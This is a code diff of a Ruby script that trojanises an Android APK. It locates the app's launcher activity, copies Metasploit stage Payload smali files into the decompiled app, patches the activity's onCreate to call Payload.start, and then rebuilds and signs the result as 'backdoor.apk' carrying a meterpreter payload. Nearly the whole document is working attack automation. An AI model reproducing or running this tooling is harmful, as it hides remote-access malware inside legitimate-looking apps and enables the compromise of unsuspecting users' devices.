@@ -1,6 +1,7 @@
 #!/usr/bin/env ruby
 
 require 'nokogiri'
+require 'fileutils'
 
 apkfile = ARGV[0]
 unless(apkfile && File.readable?(apkfile))
@@ -36,36 +37,42 @@ f = File.open("original/AndroidManifest.xml")
 amanifest = Nokogiri::XML(f)
 f.close
 
+# Find the activity that is opened when you click the app icon
 def findlauncheractivity(amanifest)
     package = amanifest.xpath("//manifest").first['package']
     activities = amanifest.xpath("//activity")
     for activity in activities 
         activityname = activity.attribute("name")
         category = activity.search('category')
-        if category
-            for cat in category
-                categoryname = cat.attribute('name')
-                if categoryname.to_s == 'android.intent.category.LAUNCHER'
-                    activityname = activityname.to_s
-                    unless activityname.start_with?(package)
-                        activityname = package + activityname
-                    end
-                    return activityname
+        unless category
+            next
+        end
+        for cat in category
+            categoryname = cat.attribute('name')
+            if categoryname.to_s == 'android.intent.category.LAUNCHER'
+                activityname = activityname.to_s
+                unless activityname.start_with?(package)
+                    activityname = package + activityname
                 end
+                return activityname
             end
         end
     end
 end
 
 launcheractivity = findlauncheractivity(amanifest)
-puts launcheractivity
+smalifile = 'original/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
+FileUtils.mkdir_p('original/smali/com/metasploit/stage/')
+FileUtils.cp Dir.glob('payload/smali/com/metasploit/stage/Payload*.smali'), 'original/smali/com/metasploit/stage/'
 
-print 'mkdir -p original/smali/com/metasploit/stage/' + "\n"
-print 'cp payload/smali/com/metasploit/stage/Payload* original/smali/com/metasploit/stage/' + "\n"
-print "\n" # modify the smali here: 
-# invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
-print 'apktool b -o backdoor.apk original ' + "\n"
-print 'jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA backdoor.apk androiddebugkey' + "\n"
-print 'adb install backdoor.apk' + "\n"
+activitysmali = File.read(smalifile)
+activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
+payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
+hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
+File.open(smalifile, "w") {|file| file.puts hookedsmali }
 
+`apktool b -o backdoor.apk original`
+`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA backdoor.apk androiddebugkey`
+
+puts "Created backdoor.apk with meterpreter payload\n"
 
